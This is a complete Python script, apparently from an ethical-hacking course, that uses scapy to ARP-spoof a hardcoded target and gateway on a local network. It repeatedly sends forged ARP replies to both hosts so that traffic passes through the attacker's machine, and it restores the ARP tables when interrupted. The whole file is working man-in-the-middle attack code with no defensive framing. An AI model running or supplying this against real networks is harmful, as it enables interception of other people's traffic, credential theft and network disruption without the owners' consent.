#!/usr/bin/env python3
import time
import scapy.all as scapy
#import sys
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  #pdst is a field
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)


def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)


target_ip = "10.10.11.3"
geteway_ip = "10.10.11.4"

try:
    packet_count = 0
    while True:
        spoof(target_ip,geteway_ip)
        spoof(geteway_ip,target_ip)
        packet_count = packet_count + 2
        print("\rpacket_sent:" + str(packet_count),end = "")
        #sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("CTRL + C detected ....... Resetting.\n")
    restore(target_ip,geteway_ip)
    restore(geteway_ip,target_ip)
